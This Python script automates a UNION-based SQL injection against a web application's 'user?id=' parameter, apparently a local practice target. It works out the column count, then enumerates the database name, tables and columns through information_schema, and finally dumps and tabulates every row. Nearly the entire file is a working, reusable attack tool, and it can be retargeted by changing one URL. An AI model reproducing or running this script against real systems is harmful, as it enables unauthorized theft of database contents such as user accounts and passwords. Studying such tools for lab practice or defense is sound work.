from requests import get
from tabulate import tabulate
import logging

logging.basicConfig(filename='log-union.txt', level=logging.INFO, format='%(asctime)s - %(levelname)s - "%(message)s"')

url = 'http://localhost:8080/user?id='

proxy = {
    "http": "http://127.0.0.1:8000",
    "https": "http://127.0.0.1:8000"     
}

def sendRequest(url):
    r = get(url, proxies=proxy)
    # r = get(url)
    
    logging.info(url)
    return r

def findQuantityColumns():
    print("[!] Finding quantity of columns")
    for i in range(1, 100):
        payload = url + "1 or 1=1 order by " + str(i)
        # print("[*] " + payload)
        # logging.info(payload)
        r = sendRequest(payload)
        if "Không tìm thấy người dùng này" in r.text:
            print("[+] Quantity of columns: " + str(i - 1))
            return i - 1

def findDatabaseName(columns):
    print("[!] Finding database name")
    
    query = "0 union select "
    for i in range(columns - 1):
        query += "null, "
    query += "DATABASE()"

    r = sendRequest(url + query)
    # print("[*] " + url + query)
    # logging.info(url + query)
    
    databaseName = r.text.split("<span>")[3].split("</span>")[0]
    print("[+] Database name: " + databaseName)
    return databaseName

def findTables(columns, database):
    query = "0 union select "
    offset = 0
    for i in range(columns - 1):
        query += "null, "
    query += "table_name from information_schema.tables where table_schema='" + database + "' limit 1 offset "
    listTables = []
    while True:
        payload = url + query + str(offset)
        # print("[*] " + payload)
        
        # r = get(payload)//
        r = sendRequest(payload)
        # logging.info(payload)
        
        table = r.text.split("<span>")[3].split("</span>")[0]
        if table == "":
            print("[+] Found " + str(len(listTables)) + " tables")
            print("[+] List of tables: " + str(listTables))
            break
        print("[+] Found table: " + table)
        offset += 1
        listTables.append(table)
    return listTables

def findColumnName(columns, listTable, database):
    query = "0 union select "
    for i in range(columns - 1):
        query += "null, "
    query += "column_name from information_schema.columns where table_schema='" + database + "' and table_name='"
    mainListColumn = []
    for table in listTable:
        offset = 0
        
        listColumns = []
        while True:
            payload = url + query + table + "' limit 1 offset " + str(offset)
            # r = get(payload)
            r = sendRequest(payload)
            # logging.info(payload)
        
            column = r.text.split("<span>")[3].split("</span>")[0]
            if column == "":
                print("[+] Found " + str(len(listColumns)) + " columns of '" + table + "' table")
                print("[+] List of columns: " + str(listColumns))
                break
            print("[+] Found column: " + column)
            offset += 1
            listColumns.append(column)
        mainListColumn.append(listColumns)
    for i in range(len(mainListColumn)):
        print("[+] List of columns of '" + listTable[i] + "' table: " + str(mainListColumn[i]))
    return mainListColumn
        
def dumpData(columns, listTable, listColumns):
    print("[!] Dumping data")
    query = "0 UNION (SELECT "
    offset = 0
    for i in range(columns - 2):
        query += "null, "
        
    listData = []
    
    
    for indexTable in range(len(listTable)):
        rowsData = []
        offset = 0
        check = True
        while check:
            columnsData = []
            for column in listColumns[indexTable]:
                payload = query + "id, "  + column
                payload += " FROM " + listTable[indexTable] + " ORDER BY id LIMIT 1 OFFSET " + str(offset) + ")"
                # print("[*] " + url + payload)
                # r = get(url + payload)
                r = sendRequest(url + payload)
                # logging.info(url + payload)
                
                
                if "Không tìm thấy người dùng này" in r.text:
                    print("[+] Found " + str(len(rowsData)) + " rows of '" + listTable[indexTable] + "' table")
                    print("[+] List of rows: " + str(rowsData))
                    check = False
                    break
                data = r.text.split("<span>")[3].split("</span>")[0]
                
                print("[+] Found data: " + data)
                columnsData.append(data)
            offset += 1
            if listTable[indexTable] == "logger" and offset == 100:
                break
            rowsData.append(columnsData)
        listData.append(rowsData)
        
    return listData
                    

def printDataTable(tableName, columnName, listData):
    print(f"\n[+] Table: {tableName}")
    print(f"\n[+] Data quantity: {len(listData)}")
    print(tabulate([columnName, *listData], headers="firstrow", tablefmt="grid"))

if __name__ == "__main__":
    column = findQuantityColumns()
    database = findDatabaseName(column)
    listTable = findTables(column, database)
    listColumns =  findColumnName(column, listTable, database)
    dataDump = dumpData(column, listTable, listColumns)
    data = {}
    for i in range(len(listTable)):
        data[listTable[i]] = dataDump[i]

    for table_name, table_data in data.items():
        print(f"\n[+] Table name: {table_name}")
        
        column_names = listColumns[listTable.index(table_name)]
        print("[+] Columns: " + ", ".join(column_names))
        
        rows_data = []
        for row_data in table_data:
            rows_data.append(row_data)
        rows_data.pop()
        printDataTable(table_name, column_names, rows_data)